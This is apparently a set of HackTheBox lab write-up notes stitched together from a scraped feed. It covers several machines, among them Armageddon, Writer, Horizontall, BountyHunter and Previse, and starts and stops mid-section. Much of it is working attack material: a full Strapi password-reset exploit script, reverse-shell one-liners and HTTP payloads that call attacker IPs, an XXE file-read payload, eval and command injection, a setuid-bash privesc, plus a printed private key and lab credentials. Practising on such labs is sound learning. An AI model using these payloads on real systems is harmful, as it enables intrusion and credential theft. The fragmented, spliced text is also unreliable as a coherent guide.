curl -sk sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip

as well as the private key for bindmgr in a file whose name starts with strace. Note down the domain sftp.infra.dyna.htb.

-----BEGIN OPENSSH PRIVATE KEY-----

NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1

CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

However,

ssh -i bindmgr bindmgr@dyna.htb

SSH with private key still requires a password… See previous step for intended path.

8- As bindmgr, sudo -l. It can execute bindmgr.sh as root.

#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
	systemctl status bind9
    else
	echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi

9- .version and a wildcard are copied to /etc/bind/named.bindmgr/. The script first checks that in the current directory there is a .version file and that the number in it is greater equal than $BINDMGR_DIR/.version. So we create a .version file in /tmp and create a bash and --preserve=mode files.

cd /tmp
cp /bin/bash .
chmod u+s bash
echo "" > "--preserve=mode"
cp $BINDMGR_DIR/.version .version
# run the script as sudo
sudo bindmgr.sh

10- The files are copied to /etc/bind/named.bindmgr/. The bash setuid bit is set and it’s owned by root.

cd /etc/bind/named.bindmgr/
bash -p

root.txt: c2ba74897b445b0e30466fa9d7b26253

item.title: Armageddon - HackTheBox machine
item.description: Rank: easy Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work). # Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.
item.content:
• Rank: easy

Foothold

1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).

# Nmap 7.91 scan initiated Sat Jul  3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.062s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  3 12:39:22 2021 -- 1 IP address (1 host up) scanned in 27.95 seconds

2- Use metasploit and search for drupalgeddon. Exploit right away.

3- Look at config files. In /var/www/html/sites/default/settings.php…

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

4- Look at the database.

mysql -u drupaluser -D drupal -p -e 'select name,pass,mail from users;'
Enter password: CQHEy@9M*m23gBVj
name	pass	mail
		
brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu

5- Crack the hash.

john -w /usr/share/wordlists/rockyou.txt --format=Drupal7 admin_hash.txt 

brucetherealadmin:booboo

Privilege escalation

6- sudo -l reveals snapd can be sudoed by brucetherealadmin. A privesc exploit for snapd is dirty_sock.

python2 -c 'print "" + "A"*4256 + "=="' | base64 -d > leet.snap

sudo snap install --devmode leet.snap
su dirty_sock # password dirty_sock, it has (ALL):ALL:ALL privileges. 
sudo su

hsqs!V\ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>x#!/bin/bash

item.title: Writer - HackTheBox machine
item.content:
• Rank: medium

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Foothold

1- Nmap found 80 (http), 139, 445 (SMB), 22 (ssh)

2- Web discovery potential exploits: 1- Uses php, contact page validate.js accesses contact.php but it returns 404??? 2- Subdomain fuzzing? wfuzz -c -u “http://writer.htb/" -H “Host:FUZZ.writer.htb” -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt –hl=318 -> None 3- Path fuzzing: wfuzz -c -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -u http://writer.htb/FUZZ > dashboard, administrative

3- SMB scanning?

enum4linux -a writer.htb > smb_enum.txt https://book.hacktricks.xyz/pentesting/pentesting-smb

Intel: 1- Usernames: john, kyle (Kyle Travis) 2- Domains: WRITER, Builtin 3- WRITER/kyle

With blank username and password CANNOT access IPC or writer2_projects shares.

4- Dashboard from Burpsuite is not interesting. See administrative –> login form.

5- Try weak credentials. No luck. Try SQLi uname=admin;–+ to access dashboard and edit stories. Try sqlmap -> None.

6- Image filename execution (command injection). ???? touch ‘1.jpg; echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxIg==| base64 -d | bash;’ Attach file 1.jpg. Catch Burpsuite packet and in “image-url” add: file:///var/www/writer.htb/writer/static/img/1.jpg; echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDQvOTAwMSAwPiYxIg==| base64 -d | bash;#

nc -lvnp 9001

7- cat /etc/mysql/mariadb.cnf: [client] database = dev user = djangouser <– password = DjangoSuperPassword <– default-character-set = utf8

8- Download the Flask source code init.py. DB credentials for DB writer: admin <– ToughPasswordToCrack <–

9- Crack kyle hash: mysql -u admin -D writer -h 127.0.0.1 -p –> nothing interesting mysql -u djangouser -D dev -h 127.0.0.1 -p kyle:pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=

hashcat -a 0 -m 10000 hash.txt /usr/share/wordlists/rockyou.txt

kyle:marcoantonio

user.txt: 332b462c2b9d80d732ae0356922ec7c6

Privilege escalation

10- Modify /etc/postfix/disclaimer exploit. ???? There is a postfix user. Why the user who runs the disclaimer script is john?

11- Apt privesc ???? See HackingArticles. /etc/apt/apt.conf.d/ is writable by management group (john).

Place exp (file) in /etc/apt/apt.conf.d/ and wait. nc -nlvp 1234

item.description: Rank: easy Part of this article is encrypted with password: --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovered 80 and 22. 2- The webpage index.html doesn’t seem to be interactive. Enumerate web server with Nikto and inspect the JS files. nikto -h horizontall.htb Vue.js v2.6.12 vue-router v3.5.1 portal-vue 2.1.7 (Although I doubt front end is any juicy to attack…) nginx/1.14.0 (Ubuntu) 3- nginx 1.14.0 has vulnerabilities that allow RCE: CVE-2021-23017> https://www.
item.content:
• Rank: easy

Part of this article is encrypted with password:

--- DON'T MODIFY THIS LINE ---

Foothold

1- Nmap discovered 80 and 22.

2- The webpage index.html doesn’t seem to be interactive. Enumerate web server with Nikto and inspect the JS files.

nikto -h horizontall.htb

Vue.js v2.6.12
vue-router v3.5.1
portal-vue 2.1.7

(Although I doubt front end is any juicy to attack…)

nginx/1.14.0 (Ubuntu)

3- nginx 1.14.0 has vulnerabilities that allow RCE: CVE-2021-23017> https://www.cybersecurity-help.cz/exploits/53543/?ref=bulletin –> but requires that the victim nginx is capable of resolving dns names (the dns resolver feature is not on by default)

4- Fuzz the websit for virtual hosts.

wfuzz -u 'http://horizontall.htb/FUZZ' -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc=404
ffuf -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb"

Found: api-prod.horizontall.htb

Fuzz paths.

ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ

Found: /reviews, /users, /admin -> /admin/auth/login

/reviews –> json of reviews –> username enumeration: john, doe, wails /admin/auth/login –> check valid email with forgot password request, admin@horizontall.htb is valid /users –> 403

5- Google strapi.

curl http://api-prod.horizontall.htb/admin/strapiversion
# {"strapiVersion":"3.0.0-beta.17.4"}

There is an authentication bypass bug at CVE-2019-18818. strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.

python3 strapi-exploit.py admin@horizontall.htb http://api-prod.horizontall.htb 1234567890

Where strapi-exploit.py is:

import requests
import sys
import json
 
args=sys.argv
 
if len(args) < 4:
    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))
    exit(-1)
 
email = args[1]
url = args[2]
new_password =  args[3]
 
s = requests.Session()
 
version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
 
print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
 
#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
s.post("{}/".format(url), json=reset_request)
 
#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)
 
print("[*] Response:")
print(str(r.content))

6- Now that I have admin dashboard access, let’s see if I can get RCE. I can upload files and I can install plugins (remember the Moodle one?). Do command injection in plugin parameter and listen for the reverse shell.

curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzU1NDc0LCJleHAiOjE2MzI5NDc0NzR9.rBvt5WdIGjI1Bqy6gwTOG2S5bwLERaaeZPYWOXPoL7A' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.75 4444 >/tmp/f)\",\"port\":\"1337\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'

Using the shell, we can get the /etc/passwd and in /opt/strapi/myapi/config/environments we can find database.json with MySQL credentials.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

Privilege escalation

7- Tried reusing mysql creds for developer but it was unsuccessful. Maybe can get the creds from mysql database. Nope.

mysql -u developer -p '#J!:F9Zt2u'

8- View listening ports.

netstat -nato

There is a Laravel page: Laravel v8 (PHP v7.4.18) at http://localhost:8000. There is a PHAR deserialization CVE that allows RCE: CVE-2021-3129. https://github.com/zhzyker/CVE-2021-3129.

9- python3 exp.py http://localhost:8000/ "system('/bin/bash');" but change exp.py with https://github.com/crisprss/Laravel_CVE-2021-3129_EXP.

Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow. Foothold 1- Nmap discovers ports 22 and 80. # Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10.
item.content:
• Rank: easy

These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.

Foothold

1- Nmap discovers ports 22 and 80.

# Nmap 7.91 scan initiated Mon Aug  2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb
Nmap scan report for bountyhunter.htb (10.10.11.100)
Host is up (0.068s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  2 03:25:06 2021 -- 1 IP address (1 host up) scanned in 159.69 seconds

2- Web clues: 1- Copyright name is John –> potential username. 2- Machine owner is a BurpSuite user. 3- HTML comments suggest we can configure the contact form email address by editing mail/contact_me.php line 19 4- 404 assets/mail/contact_me.js 5- Debugger files: resources folder –> README.txt is a TODO list of things to fix –> ‘test’ account, unhashed passwords, NOPASS enabled on DB, tracker.php not connected to DB. Because the DB port is not open, this is useless. 6- Portal under development at log_submit.php.

3- XSS failed at log_submit.php.

4- Inspect log_submit.php: bountySubmit() -> see /resources/bountylog.js

function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}

5- XXE XML external entity injection to read db.php. Use the PHP filter to read arbitrary files:

php://filter/convert.base64-encode/resource=/var/www/html/db.php

Use the web developer console to run these commands that mimic a bounty submission.

var xml = `<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">] > <bugreport><title>&xxe;</title><cwe>T</cwe><cvss>T</cvss><reward>T</reward></bugreport>`

let data = returnSecret(btoa(xml))

It returns:

Promise { <state>: "fulfilled", <value>: "If DB were ready, would have added:\n<table>\n  <tr>\n    <td>Title:</td>\n    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>\n  </tr>\n  <tr>\n    <td>CWE:</td>\n    <td>T</td>\n  </tr>\n  <tr>\n    <td>Score:</td>\n    <td>T</td>\n  </tr>\n  <tr>\n    <td>Reward:</td>\n    <td>T</td>\n  </tr>\n</table>\n" }

6- Decode base64 of /var/www/html/db.php.

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";   // --> useful for password reuse 
$testuser = "test";
?>

7- Use XXE to read /etc/passwd. See passwd file. The only users with /bin/bash are root and development. Reuse the dbpassword to ssh into them. Get user.txt.

passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

Privilege escalation

8- Read contract.txt. Clues are: ‘I set up the permissions for you to test this.’. Let’s see the permissions with sudo -l. I can run python tickerValidator.py with sudo.

9- Potentials privesc ways: snap lxd privesc, sudo NOPASSWD python ticketValidator.py.

#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

10- Exploit the eval() statement to include __import__('os').system('/bin/bash'). Hand craft a ticket.md.

# Skytrain Inc
## Ticket to 
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('cat /root/root.txt') == False

11- Use the hand-crafted ticket to get root shell.

python ticketValidator.py ticket.md

|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds

2- http://previse.htb/login.php is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt.

Try with SQLi:

sqlmap -r request.txt -p password 
# (try with username param too)

No SQLi flaws discovered by sqlmap.

3- Fuzz the request path.

wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc=404 http://previse.htb

Interesting files:

index.php -- 302 Found --> RESPONSE1 (see step 4 for details)
login.php
config.php
download.php -- 302 --> login.php
header.php
footer.php
status.php -- 302 --> MySQL server is running!
nav.php
accounts.php -- 302 --> Create an admin account
files.php -- 302  --> backup.zip YEAH!!! Site backups are very welcome!

4- Intercept request packet with BurpSuite and intercept the response. See annotations above.

RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).

5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.

<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>

MySQL credentials:

root
mySQL_p@ssw0rd!:)
DBname: previse

But we can only access the database from localhost… Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it’s specific to MySQL service.

6- Revise all files in the site backup folder. Look at logs.php. exec() promises a command injection opportunity.

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
} 
?>

The interesting part is here:

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

We can trigger a reverse shell.

Target command:

python log_process.py comma;python3 -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

Change the POST param in Burpsuite:

POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://previse.htb
DNT: 1
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

delim=comma;python3+-c+'import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

7- To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:

mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

> use previse;
> show tables;  # accounts and files
> select * from accounts;
# columns id, username, password and created_at

So, the username is m4lwhere and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.

hashcat -a 0 -m 500 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Same but with –show:

username = m4lwhere
hash = $1$ð§llol$DQpmdvnb7EeuO6UaqRItf.
password = ilovecody112235!

Note that john doesn’t support non-printable characters in hash.

8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f

Privilege escalation

9- sudo -l reveals the script /opt/scripts/access_backup.sh.

10- Copy to local machine:

scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh .

By looking at this file, we find command path vulnerability.

#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

